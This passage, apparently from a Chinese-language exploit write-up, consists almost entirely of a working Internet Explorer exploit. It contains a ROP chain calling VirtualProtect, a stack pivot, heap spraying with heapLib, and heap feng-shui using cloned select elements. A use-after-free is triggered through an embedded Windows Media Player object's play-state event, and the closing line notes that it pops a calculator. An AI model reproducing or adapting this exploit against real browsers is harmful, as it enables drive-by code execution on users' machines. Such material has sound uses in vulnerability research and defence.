    "%u1921%u0040" + // 0x00401921 : ,# RETN (ROP NOP) [iexplore.exe]
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u187a%u0040" + // 0x0040187a : ,# POP ESI # RETN [iexplore.exe] 
    "%u9336%u0040" + // 0x00409336 : ,# JMP [EAX] [iexplore.exe]
    "%u2120%u0040" + // 0x00402120 : ,# POP EAX # POP EBP # RETN [iexplore.exe] 
    "%u121c%u75e0" + // 0x75e0121c : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT SXS.DLL]
    "%u0c60%u0c0c" + // 0x41414141 : ,# Filler (compensate)
    "%u2cec%u75e5" + // 0x75e52cec : ,# PUSHAD # RETN [SXS.DLL] 
    "%u318b%u7d5a" + // 0x7d5a318b : ,# jmp esp [shell32.dll]
"");

var padding = unescape("%u0c0c%u0c0c");
var padrop = unescape(
    "%u404c%u7d5d" + // 7d5d404c pop esi; ret 4;
    "%ud0fb%u7c96" + // 7C96D0FB xchg ecx,esp; ret
"");
rop = padrop + rop;

while (padding.length < 0x1000) padding += padding; // create big block of nops

offset_length = 0x5F6;
junk_offset = padding.substring(0, offset_length);

var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);

while (shellcode.length < 0x40000) shellcode += shellcode;

var block = shellcode.substring(2, 0x40000 - 0x21);
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);
}

</script>
<script language='javascript'>
var heap = new heapLib.ie();
var selob = document.createElement("select")
selob.w0 = alert
selob.w1 = unescape("%u0c0c%u0c0c")
selob.w2 = alert
selob.w3 = alert
selob.w4 = alert
selob.w5 = alert
selob.w6 = alert
selob.w7 = alert
selob.w8 = alert
selob.w9 = alert
selob.w10 = alert
selob.w11 = alert
selob.w12 = alert
selob.w13 = alert
selob.w14 = alert
selob.w15 = alert
selob.w16 = alert
selob.w17 = alert
selob.w18 = alert
selob.w19 = alert
selob.w20 = alert
selob.w21 = alert
selob.w22 = alert
selob.w23 = alert
selob.w24 = alert
selob.w25 = alert
selob.w26 = alert
selob.w27 = alert
selob.w28 = alert
selob.w29 = alert
selob.w30 = alert
selob.w31 = alert
selob.w32 = alert
selob.w33 = alert
selob.w34 = alert
selob.w35 = alert
selob.w36 = alert
selob.w37 = alert
selob.w38 = alert
selob.w39 = alert
selob.w40 = alert
selob.w41 = alert
selob.w42 = alert
selob.w43 = alert
selob.w44 = alert
selob.w45 = alert
selob.w46 = alert
selob.w47 = alert
selob.w48 = alert
selob.w49 = alert
selob.w50 = alert
selob.w51 = alert
selob.w52 = alert
selob.w53 = alert
selob.w54 = alert
selob.w55 = alert
selob.w56 = alert
selob.w57 = alert
selob.w58 = alert
selob.w59 = alert
selob.w60 = alert
selob.w61 = alert
selob.w62 = alert
selob.w63 = alert

var clones=new Array(1000);

function feng_shui() {

    heap.gc();

    var i = 0;
    while (i < 1000) {
        clones[i] = selob.cloneNode(true)
        i = i + 1;
    }

    var j = 0;
    while (j < 1000) {
        delete clones[j];
        CollectGarbage();
        j  = j + 2;
    }

}

feng_shui();

function trigger(){
    var k = 999;
    while (k > 0) {
        if (typeof(clones[k].w1) == "string") {
        } else {
            clones[k].w1('come on!');
        }
        k = k - 2;
    }
    feng_shui();
    document.audio.Play();
}


</script>
<script for=audio event=PlayStateChange(oldState,newState)>
    if (oldState == 3 && newState == 0) {
        trigger();
    }
</script>
</head>
<body>
    <object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
        <param name="fileName" value="test_case.mid">
        <param name="SendPlayStateChangeEvents" value="true">
        <param NAME="AutoStart" value="True">
        <param name="uiMode" value="mini">
        <param name="Volume" value="-300">
    </object>
</body>
</html>
```

可以弹出计算器。

